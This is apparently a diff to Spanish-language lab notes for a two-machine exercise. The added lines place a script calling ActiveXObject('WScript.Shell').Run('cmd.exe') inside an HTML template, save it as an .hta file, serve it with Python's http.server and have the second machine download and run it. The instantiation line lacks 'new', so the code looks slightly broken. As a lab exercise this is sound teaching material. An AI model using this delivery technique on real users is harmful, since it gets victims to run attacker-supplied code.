@@ -5,7 +5,15 @@
 ++ PC1: Generar un template de html básico, ejemplo:
 <html>
 <body>
+<script>
+ActiveXObject('WScript.Shell').Run('cmd.exe')
+</script>
 <h1> title </h1>
 <p> text </p>
 </body>
 </html>
+
+++ PC1: Guardar el archivo como .hta
+++ PC1: python3 -m http.server 8080
+++ PC2: Usando un navegador web colocar la ip de PC1 para acceder al servidor y descargar el archivo .hta
+++ PC2: Ejecutar el archivo .hta
